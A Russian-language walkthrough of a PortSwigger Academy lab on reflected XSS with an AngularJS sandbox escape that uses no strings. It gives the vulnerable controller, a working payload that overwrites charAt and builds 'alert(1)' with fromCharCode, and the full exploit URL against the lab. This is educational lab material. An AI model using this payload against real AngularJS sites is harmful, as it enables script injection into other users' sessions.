Произведем случайный запрос , и нажмем `inspect` страницы 
и увидим следующий скрипт
```
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'hello';
                            $scope.value = $parse(key)($scope.query);
                        });
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/26.%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/pics%20for%20walkthrough/1.png)

Перейдем в читлист 
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```
во вкладку `AngularJS sandbox escapes reflected` и выберем нужный нам пэйлоад
```
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Эксплойт использует` toString ()` для создания строки без использования кавычек. Затем он получает прототип строки и перезаписывает функцию charAt для каждой строки. Это эффективно нарушает песочницу AngularJS. Затем массив передается фильтру orderBy. Затем мы задаем аргумент для фильтра, снова используя `toString ()` для создания строки и свойства конструктора String. Наконец, мы используем метод `fromCharCode` для генерации нашей полезной нагрузки путем преобразования кодов символов в строку `x=alert(1)`. Поскольку функция charAt была перезаписана, AngularJS разрешит этот код там, где обычно его нет.

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/26.%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/pics%20for%20walkthrough/2.png)

Применим его в нашем url и получим уведомление об успешно выполненной лабораторной работе
```
https://0a0200cb0417551d80d9c1a0009400ba.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/26.%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/pics%20for%20walkthrough/3.png)
